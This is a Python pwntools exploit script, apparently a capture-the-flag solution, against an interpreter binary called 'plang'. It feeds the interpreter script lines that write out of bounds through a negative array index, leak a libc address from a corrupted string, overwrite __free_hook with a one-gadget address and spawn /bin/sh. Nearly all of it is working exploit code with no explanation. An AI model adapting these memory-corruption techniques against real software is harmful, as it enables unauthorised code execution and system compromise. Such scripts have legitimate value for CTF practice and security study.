from pwn import *
from heaputils import *
from subprocess import check_output

def pack(addr):
	return check_output(["./pack",str(addr)]).strip()

cmdline = "./ld-2.27.so ./plang"
libc = ELF("./libs/libc-2.27.so")
p = process(cmdline.split(" "),env={"LD_LIBRARY_PATH":"./libs"})
PIE = get_PIE(p,start=9)

breakpoints = [0x1048F, 0x1046F]
script = ""
for x in breakpoints:
	script += "b *0x%x\n"%(x+PIE)

#gdb.attach(p,gdbscript=script)

# stage for leaking: corrupt a string
make_large_string = '''
var obj = "1111"
'''

for i in range(20):
	make_large_string += "obj = obj + obj\n"

overwrite_str = '''
var victim = "1234567812345678"
var array = [1.0,2.0,3.0,4.0]
array[-72.0] = obj
'''

leak = '''
System.print(victim[8])
System.print(victim[9])
System.print(victim[10])
System.print(victim[11])
System.print(victim[12])
System.print(victim[13])
'''

for l in make_large_string.split("\n"):
	p.recvuntil("> ")
	p.sendline(l.strip())

for l in overwrite_str.split("\n"):
	p.recvuntil("> ")
	p.sendline(l.strip())

LEAK = ""
p.recvuntil("> ")
for l in leak.split("\n"):
	p.sendline(l.strip())
	LEAK += p.recv(4).strip("\n> ")

LIBC = u64(LEAK.ljust(0x8,"\x00")) - 0x7f2cf6cff010 + 0x7f2cf7301000
log.info("LIBC: 0x%x"%LIBC)
hook = LIBC + libc.symbols['__free_hook']
oneshot = LIBC + 0x4f322

manipulate_vector = '''
var hook = Num.fromString("{}")
var oneshot = Num.fromString("{}")
array[-34.0] = hook
array[0] = oneshot
'''.format(pack(hook-8),pack(oneshot))

#gdb.attach(p,gdbscript=script)

for l in manipulate_vector.split("\n"):
	p.sendline(l.strip())
p.sendline('var y = "/bin/sh"')
p.interactive()
